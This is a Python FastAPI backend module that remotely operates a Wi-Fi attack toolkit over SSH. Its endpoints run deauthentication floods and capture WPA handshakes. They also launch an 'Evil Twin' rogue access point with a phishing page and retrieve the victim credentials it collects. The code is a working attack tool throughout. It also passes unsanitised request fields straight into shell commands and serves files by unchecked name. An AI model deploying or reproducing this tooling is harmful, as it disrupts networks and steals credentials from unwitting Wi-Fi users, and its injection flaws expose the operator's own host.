from fastapi import APIRouter, HTTPException
from fastapi.responses import FileResponse
from pydantic import BaseModel
from app.modules.ai_agent.service import ai_service
from app.core.ssh_manager import ssh_client
import os
import time
from pathlib import Path

router = APIRouter()


class AttackRequest(BaseModel):
    bssid: str
    interface: str = "wlan0"
    channel: str = "1"
    duration: int = 60
    ap_interface: str = "wlan1"
    ssid: str = "Free_WiFi"
    template_html: str = ""


# 自动寻找本地 payload 路径
def find_payload_script(name):
    base = Path(__file__).parents[4]  # 假设在 backend/app/api/v1/endpoints
    paths = [
        base / "kali_payloads" / name,
        Path.cwd() / "kali_payloads" / name,
    ]
    for p in paths:
        if p.exists(): return str(p)
    return None


@router.get("/download/{filename}")
async def download_file(filename: str):
    path = Path.cwd() / "captures" / filename
    if path.exists():
        return FileResponse(path=path, filename=filename)
    raise HTTPException(404, "File not found")


@router.post("/deauth")
async def start_deauth(req: AttackRequest):
    if not ssh_client.client: ssh_client.connect()
    script = "attack_worker.py"
    local = find_payload_script(script)
    if not local: raise HTTPException(500, f"Missing {script}")

    remote = ssh_client.upload_payload(local, script)
    # 后台运行
    cmd = f"nohup python3 {remote} deauth --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {req.duration} > /tmp/attack.log 2>&1 &"
    ssh_client.exec_command(cmd)
    return {"status": "started", "msg": "Deauth attack started"}


@router.post("/handshake")
async def start_handshake(req: AttackRequest):
    """
    握手包捕获：同步等待 worker 返回结果
    """
    if not ssh_client.client: ssh_client.connect()

    script = "attack_worker.py"
    local = find_payload_script(script)
    if not local: raise HTTPException(500, "Local payload missing")
    remote = ssh_client.upload_payload(local, script)

    # 关键：get_pty=True 才能实时拿到 print 输出
    cmd = f"python3 {remote} handshake --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {req.duration}"

    try:
        # 设置超时时间比 duration 稍长
        stdin, stdout, stderr = ssh_client.exec_command(cmd, timeout=req.duration + 10, get_pty=True)
        output = stdout.read().decode()

        # 本地保存路径
        local_dir = Path.cwd() / "captures"
        if not local_dir.exists(): local_dir.mkdir(parents=True)

        # 检查是否成功
        if "CAPTURED_HS_POTENTIAL" in output:
            remote_prefix = f"/tmp/handshake_{req.bssid.replace(':', '')}"
            ts = int(time.time())

            # 下载 .cap
            remote_cap = f"{remote_prefix}-01.cap"
            local_cap = f"handshake_{ts}.cap"

            # 检查远程文件是否存在
            check = ssh_client.exec_command(f"ls {remote_cap}")[1].read()
            if check:
                if ssh_client.download_file(remote_cap, str(local_dir / local_cap)):
                    return {
                        "status": "success",
                        "msg": "握手包捕获成功",
                        "cap_file": local_cap,
                        "debug_log": output
                    }
            return {"status": "warning", "msg": "检测到握手包但下载失败", "debug": output}

        else:
            return {"status": "failed", "msg": "未捕获到握手包 (超时)", "debug": output}

    except Exception as e:
        return {"status": "error", "msg": str(e)}


# --- Evil Twin 部分 ---
@router.post("/eviltwin/start")
async def start_et(req: AttackRequest):
    if req.interface == req.ap_interface:
        raise HTTPException(400, "Attack and AP interfaces must be different")

    if not ssh_client.client: ssh_client.connect()

    # 上传脚本
    et_script = ssh_client.upload_payload(find_payload_script("eviltwin_worker.py"), "eviltwin_worker.py")
    atk_script = ssh_client.upload_payload(find_payload_script("attack_worker.py"), "attack_worker.py")

    # 启动 AP
    clean_html = req.template_html.replace('"', '\\"').replace('`', '\\`')
    ssh_client.exec_command("echo '[Init] Starting AP...' > /tmp/eviltwin.log")
    cmd_ap = f"nohup python3 {et_script} --interface {req.ap_interface} --ssid '{req.ssid}' --template \"{clean_html}\" >> /tmp/eviltwin.log 2>&1 &"
    ssh_client.exec_command(cmd_ap)

    # 启动 Deauth (无限)
    ssh_client.exec_command("echo '[Init] Starting Attack...' > /tmp/et_deauth.log")
    cmd_atk = f"nohup python3 {atk_script} deauth --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration 0 >> /tmp/et_deauth.log 2>&1 &"
    ssh_client.exec_command(cmd_atk)

    return {"status": "started", "msg": "Evil Twin Started"}


@router.post("/eviltwin/stop")
async def stop_et():
    if not ssh_client.client: ssh_client.connect()
    ssh_client.exec_command("pkill -f eviltwin_worker.py")
    ssh_client.exec_command("pkill -f attack_worker.py")
    ssh_client.exec_command("killall hostapd dnsmasq aireplay-ng airodump-ng")
    ssh_client.exec_command("iptables -t nat -F")
    return {"status": "success"}


@router.get("/eviltwin/credentials")
async def get_creds():
    if not ssh_client.client: ssh_client.connect()
    try:
        out = ssh_client.exec_command("cat /tmp/eviltwin/captured_creds.txt")[1].read().decode()
        return {"status": "success", "data": [l.strip() for l in out.splitlines() if l.strip()]}
    except:
        return {"status": "empty", "data": []}


@router.get("/eviltwin/logs")
async def get_logs():
    if not ssh_client.client: ssh_client.connect()
    try:
        cmd = "tail -n 5 /tmp/eviltwin.log; echo '---'; tail -n 5 /tmp/et_deauth.log"
        out = ssh_client.exec_command(cmd)[1].read().decode()
        return {"status": "success", "logs": [l.strip() for l in out.splitlines() if l.strip()]}
    except:
        return {"status": "error", "logs": []}